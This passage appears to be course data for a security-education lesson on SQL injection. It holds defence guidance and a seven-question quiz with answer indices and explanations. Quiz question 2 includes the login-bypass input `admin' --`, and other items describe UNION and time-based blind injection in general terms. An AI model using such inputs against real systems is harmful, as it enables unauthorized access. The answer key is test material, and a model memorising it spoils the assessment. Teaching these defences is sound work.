                    "- Never connect to the database as the admin user\n"
                    "- Separate read and write permissions where possible\n\n"
                    "**4. Stored Procedures**\n"
                    "Pre-compiled SQL stored procedures can add a layer of "
                    "protection, but they must still use parameterized inputs.\n\n"
                    "**5. Web Application Firewalls (WAF)**\n"
                    "A WAF can detect and block SQL injection attempts in "
                    "HTTP traffic. This is a valuable defense-in-depth measure "
                    "but should not be the primary defense.\n\n"
                    "> The golden rule: **never concatenate user input into SQL "
                    "> queries**. Use parameterized queries every single time. "
                    "> No exceptions."
                )
            }
        ],
        "quizzes": [
            {
                "question_number": 1,
                "question_type": "multiple_choice",
                "question_text": "What causes SQL injection?",
                "options": [
                    "Using an outdated version of SQL",
                    "Directly inserting unsanitized user input into database queries",
                    "Having too many tables in the database",
                    "Using the wrong database engine"
                ],
                "correct_index": 1,
                "explanation": "SQL injection occurs when user input is concatenated directly into a SQL query string without sanitization. This allows the user's input to alter the intended query logic."
            },
            {
                "question_number": 2,
                "question_type": "multiple_choice",
                "question_text": "What does the following SQL injection do: `admin' --`?",
                "options": [
                    "Deletes the admin account",
                    "Changes the admin password",
                    "Bypasses the password check by commenting out the rest of the query",
                    "Creates a new admin user"
                ],
                "correct_index": 2,
                "explanation": "The `--` in SQL is a comment marker. When inserted after the username, it comments out the password check in the query, allowing the attacker to log in as admin without a password."
            },
            {
                "question_number": 3,
                "question_type": "multiple_choice",
                "question_text": "What is the difference between in-band and blind SQL injection?",
                "options": [
                    "In-band uses SQL, blind uses NoSQL",
                    "In-band returns results directly in the response; blind requires inferring data indirectly",
                    "In-band only works on MySQL, blind only works on PostgreSQL",
                    "There is no difference — they are the same technique"
                ],
                "correct_index": 1,
                "explanation": "In-band SQL injection returns query results directly in the page. Blind SQL injection works when results are not shown — the attacker must use Boolean conditions or time delays to infer data character by character."
            },
            {
                "question_number": 4,
                "question_type": "multiple_choice",
                "question_text": "How does a UNION-based SQL injection attack work?",
                "options": [
                    "It unions two databases into one",
                    "It uses UNION SELECT to combine injected query results with legitimate results from the original query",
                    "It merges two tables together permanently",
                    "It creates a new table to store extracted data"
                ],
                "correct_index": 1,
                "explanation": "UNION-based SQL injection uses SQL's UNION operator to combine the attacker's injected SELECT query with the application's legitimate query. Both queries must have the same number of columns for this to work."
            },
            {
                "question_number": 5,
                "question_type": "multiple_choice",
                "question_text": "Why is time-based blind SQL injection useful?",
                "options": [
                    "It makes the database run faster",
                    "It allows attackers to extract data by measuring response time differences when conditions are true or false",
                    "It prevents the database from timing out",
                    "It speeds up the injection process by using caching"
                ],
                "correct_index": 1,
                "explanation": "Time-based blind injection uses SQL functions like SLEEP() to create measurable time delays. If a condition is true, the page takes longer to respond. By timing responses, the attacker determines whether each condition is true or false."
            },
            {
                "question_number": 6,
                "question_type": "multiple_choice",
                "question_text": "What is the primary defense against SQL injection?",
                "options": [
                    "Using a firewall to block all database access",
                    "Encrypting the entire database with AES-256",
                    "Using parameterized queries (prepared statements) so user input is never part of the SQL command",
                    "Disabling SQL and using NoSQL instead"
                ],
                "correct_index": 2,
                "explanation": "Parameterized queries bind user input as separate parameters rather than concatenating them into the SQL string. The database treats user input as data, never as executable SQL code."
            },
            {
                "question_number": 7,
                "question_type": "multiple_choice",
                "question_text": "Why should database user accounts follow the principle of least privilege?",
                "options": [
                    "It makes the database run faster",
                    "It reduces the damage an attacker can do if they successfully exploit SQL injection",
                    "It prevents SQL injection from happening in the first place",
                    "It makes database backups easier"
                ],
                "correct_index": 1,
                "explanation": "Least privilege means giving the database account only the minimum permissions needed. Even if an attacker exploits SQL injection, limited permissions prevent them from dropping tables, modifying schema, or executing system commands."
            }
        ]
    },
]
